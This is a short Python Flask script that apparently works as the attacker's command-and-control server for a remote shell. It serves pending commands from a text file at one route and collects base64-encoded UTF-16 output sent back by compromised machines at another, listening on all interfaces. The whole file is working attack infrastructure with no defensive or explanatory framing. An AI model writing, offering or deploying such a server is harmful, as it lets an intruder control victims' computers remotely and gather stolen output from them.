from flask import Flask
import base64

app = Flask(__name__)

@app.route("/")
def GET_hello():
    with open('shell.txt','w') as ifile:
        ifile.write('')
    return 'hello'

@app.route("/cli")
def GET_cmd():
    with open('shell.txt','r') as ifile:
        message = ifile.read()
    return message

@app.route("/hax/<path:subpath>")
def waiting(subpath):
    with open('shell.txt','w') as ifile:
        ifile.write('')
    with open('shell2.txt','w') as ofile:
        ofile.write(str(base64.b64decode(subpath).decode('utf-16')))
    return ""

if __name__ == "__main__":
    app.run(host= '0.0.0.0',port=8080)
